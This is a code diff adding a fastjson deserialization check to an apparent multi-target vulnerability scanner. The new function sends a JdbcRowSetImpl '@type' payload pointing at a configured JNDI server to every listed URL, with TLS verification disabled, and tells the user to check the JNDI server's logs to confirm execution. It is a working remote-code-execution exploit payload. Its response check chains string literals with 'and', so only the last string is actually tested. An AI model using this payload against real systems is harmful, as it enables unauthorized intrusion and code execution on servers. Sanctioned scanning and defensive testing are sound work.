@@ -10,6 +10,7 @@ from config import nacos_user_dir
 from config import nacos_pass_dir
 import json
 
+from config import jndi_server
 
 
 # elasticsearch数据库相关漏洞扫描
@@ -365,6 +366,42 @@ def tomcat_vuln_scan():
         except:
             pass
 
+# fastjson相关漏洞扫描
+def fastjson_vuln_scan():
+    url_list = basic.url_file_ip_list()
+    # 获取当前时间
+    now = datetime.now()
+    # 格式化时间，只保留时、分、秒
+    formatted_time = now.strftime("%H:%M:%S")
+    fastjson_header = {
+        'Accept-Encoding': 'gzip, deflate',
+        'Accept': '*/*',
+        'Accept-Language': 'en',
+        'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
+        'Connection': 'close',
+        'Content-Type': 'application/json',
+        'Content-Length': '160'
+    }
+    # 构造POST请求的body  
+    fastjson_data = {  
+        "b": {  
+            "@type": "com.sun.rowset.JdbcRowSetImpl",  
+            "dataSourceName": jndi_server,  
+            "autoCommit": True  
+        }  
+    }  
+    # 将data字典转换为JSON字符串  
+    data_json = json.dumps(fastjson_data) 
+    for url in url_list:
+        try:
+            # 发送POST请求  
+            fastjson_response = requests.post(url, headers=fastjson_header, data=data_json,allow_redirects=False,verify=False)
+            fastjson_response.encoding='utf-8'
+            fastjson_response_text = fastjson_response.text
+            if 'timestamp' and '500' and 'Internal Server Error' and 'set property error, autoCommit' in fastjson_response_text:
+                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+" "+"存在fastjson反序列漏洞,请检查JNDI服务日志确认是否成功执行")
+        except:
+            pass
 
 
 
@@ -379,6 +416,8 @@ if __name__ == "__main__":
             chandao_vuln_scan()
         elif func_name == 'tomcat_vuln_scan':
             tomcat_vuln_scan()
+        elif func_name == 'fastjson_vuln_scan':
+            fastjson_vuln_scan()    
         else:
             print("Invalid function number")
     else:
